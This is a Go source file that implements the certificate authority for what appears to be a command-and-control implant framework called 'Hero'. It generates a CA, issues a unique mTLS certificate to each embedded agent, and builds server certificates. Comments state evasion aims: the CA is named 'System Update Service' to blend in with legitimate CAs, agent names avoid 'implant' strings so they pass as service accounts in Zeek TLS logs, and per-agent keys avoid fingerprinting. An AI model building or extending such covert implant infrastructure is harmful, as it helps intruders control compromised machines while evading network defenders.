package certs

// ============================================================
// Hero PKI — Self-Signed Certificate Authority
// ============================================================
// Flow:
//   1. Server first run → GenerateCA() → CA keypair + self-signed cert
//   2. Agent build     → IssueAgentCert() → unique cert signed by CA
//   3. mTLS handshake  → both sides verify against same CA
//
// Every agent gets a UNIQUE cert — same CA, different keypair+serial.
// No two agents share a cert — compromise of one doesn't affect others.
// ============================================================

import (
        "crypto/ecdsa"
        "crypto/elliptic"
        "crypto/rand"
        "crypto/x509"
        "crypto/x509/pkix"
        "encoding/pem"
        "fmt"
        "math/big"
        "time"
)

// CABundle — server ka CA (private key + cert)
type CABundle struct {
        PrivKey  *ecdsa.PrivateKey
        Cert     *x509.Certificate
        CertPEM  []byte // PEM encoded cert (embed in agent + use for TLS)
        KeyPEM   []byte // PEM encoded private key (server only, never leaves)
}

// AgentCert — ek agent ke liye unique cert
type AgentCert struct {
        AgentID  string
        CertPEM  []byte // agent ke andar embed hoga
        KeyPEM   []byte // agent ke andar embed hoga
        Serial   string // unique identifier
        IssuedAt time.Time
        ExpiresAt time.Time
}

// GenerateCA — Hero ka khud ka Root CA banao
// ECDSA P-384 — RSA se faster, smaller keys, same security
func GenerateCA() (*CABundle, error) {
        // P-384 curve — NSA Suite B compliant, strong enough
        privKey, err := ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
        if err != nil {
                return nil, fmt.Errorf("CA key generation failed: %w", err)
        }

        // Random serial number — fingerprinting prevent karo
        serial, err := randomSerial()
        if err != nil {
                return nil, fmt.Errorf("serial generation failed: %w", err)
        }

        // CA cert template
        // CN intentionally generic — blend in with legitimate CAs (B-M3: no "hero" string)
        now := time.Now()
        template := &x509.Certificate{
                SerialNumber: serial,
                Subject: pkix.Name{
                        CommonName:         "System Update Service",
                        Organization:       []string{"Update Services"},
                        OrganizationalUnit: []string{"Security"},
                        Country:            []string{"US"},
                },
                NotBefore:             now.Add(-10 * time.Minute), // clock skew tolerance
                NotAfter:              now.Add(10 * 365 * 24 * time.Hour), // 10 years
                IsCA:                  true,
                KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageCRLSign,
                BasicConstraintsValid: true,
                MaxPathLen:            1, // Only one level of signing
        }

        // Self-sign the CA cert
        certDER, err := x509.CreateCertificate(rand.Reader, template, template, &privKey.PublicKey, privKey)
        if err != nil {
                return nil, fmt.Errorf("CA cert creation failed: %w", err)
        }

        // Parse back to get x509.Certificate object
        cert, err := x509.ParseCertificate(certDER)
        if err != nil {
                return nil, fmt.Errorf("CA cert parse failed: %w", err)
        }

        // PEM encode
        certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

        keyDER, err := x509.MarshalECPrivateKey(privKey)
        if err != nil {
                return nil, fmt.Errorf("CA key marshal failed: %w", err)
        }
        keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

        return &CABundle{
                PrivKey: privKey,
                Cert:    cert,
                CertPEM: certPEM,
                KeyPEM:  keyPEM,
        }, nil
}

// IssueAgentCert — CA se ek unique agent cert sign karo
// Har agent ke liye alag keypair + alag serial = no fingerprint overlap
func (ca *CABundle) IssueAgentCert(agentID string) (*AgentCert, error) {
        // Unique keypair for this agent
        privKey, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
        if err != nil {
                return nil, fmt.Errorf("agent key generation failed: %w", err)
        }

        serial, err := randomSerial()
        if err != nil {
                return nil, fmt.Errorf("agent serial failed: %w", err)
        }

        now := time.Now()
        // Agent cert validity — 1 year
        // Short enough to limit damage if compromised
        // Long enough to not expire during ops
        notAfter := now.Add(365 * 24 * time.Hour)

        template := &x509.Certificate{
                SerialNumber: serial,
                Subject: pkix.Name{
                        // B-M3: Generic CN — no "agent" / "implant" / "hero" strings.
                        // "svc-update-XXXX" reads as a service-account cert in Zeek TLS logs.
                        CommonName:   fmt.Sprintf("svc-update-%s", agentID[:8]),
                        Organization: []string{"Update Services"},
                },
                NotBefore: now.Add(-10 * time.Minute),
                NotAfter:  notAfter,
                KeyUsage:  x509.KeyUsageDigitalSignature,
                ExtKeyUsage: []x509.ExtKeyUsage{
                        x509.ExtKeyUsageClientAuth, // mTLS client authentication
                },
                BasicConstraintsValid: true,
                IsCA:                  false,
        }

        // Sign with CA private key
        certDER, err := x509.CreateCertificate(rand.Reader, template, ca.Cert, &privKey.PublicKey, ca.PrivKey)
        if err != nil {
                return nil, fmt.Errorf("agent cert signing failed: %w", err)
        }

        // PEM encode
        certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})

        keyDER, err := x509.MarshalECPrivateKey(privKey)
        if err != nil {
                return nil, fmt.Errorf("agent key marshal failed: %w", err)
        }
        keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

        return &AgentCert{
                AgentID:   agentID,
                CertPEM:   certPEM,
                KeyPEM:    keyPEM,
                Serial:    serial.String(),
                IssuedAt:  now,
                ExpiresAt: notAfter,
        }, nil
}

// LoadCABundle — PEM bytes se CA restore karo (DB se load ke baad)
func LoadCABundle(certPEM, keyPEM []byte) (*CABundle, error) {
        // Parse cert
        block, _ := pem.Decode(certPEM)
        if block == nil {
                return nil, fmt.Errorf("invalid CA cert PEM")
        }
        cert, err := x509.ParseCertificate(block.Bytes)
        if err != nil {
                return nil, fmt.Errorf("CA cert parse: %w", err)
        }

        // Parse key
        block, _ = pem.Decode(keyPEM)
        if block == nil {
                return nil, fmt.Errorf("invalid CA key PEM")
        }
        privKey, err := x509.ParseECPrivateKey(block.Bytes)
        if err != nil {
                return nil, fmt.Errorf("CA key parse: %w", err)
        }

        return &CABundle{
                PrivKey: privKey,
                Cert:    cert,
                CertPEM: certPEM,
                KeyPEM:  keyPEM,
        }, nil
}

// BuildTLSCertForServer — server ke liye TLS cert banao (CA se signed)
// Ye external fullchain.pem ki jagah use hoga agar user CA mode choose kare
func (ca *CABundle) BuildServerCert(host string) (certPEM, keyPEM []byte, err error) {
        privKey, keyErr := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
        if keyErr != nil {
                return nil, nil, fmt.Errorf("server key gen: %w", keyErr)
        }

        serial, _ := randomSerial()
        now := time.Now()

        template := &x509.Certificate{
                SerialNumber: serial,
                Subject: pkix.Name{
                        CommonName:   host,
                        Organization: []string{"Update Services"},
                },
                NotBefore:   now.Add(-10 * time.Minute),
                NotAfter:    now.Add(2 * 365 * 24 * time.Hour),
                KeyUsage:    x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
                ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
                DNSNames:    []string{host, "localhost"},
        }

        certDER, err := x509.CreateCertificate(rand.Reader, template, ca.Cert, &privKey.PublicKey, ca.PrivKey)
        if err != nil {
                return nil, nil, fmt.Errorf("server cert sign: %w", err)
        }

        certPEM = pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
        // Append CA cert for full chain
        certPEM = append(certPEM, ca.CertPEM...)

        keyDER, _ := x509.MarshalECPrivateKey(privKey)
        keyPEM = pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

        return certPEM, keyPEM, nil
}

// ============================================================
// Helpers
// ============================================================

func randomSerial() (*big.Int, error) {
        // 128-bit random serial — collision probability negligible
        b := make([]byte, 16)
        if _, err := rand.Read(b); err != nil {
                return nil, err
        }
        return new(big.Int).SetBytes(b), nil
}
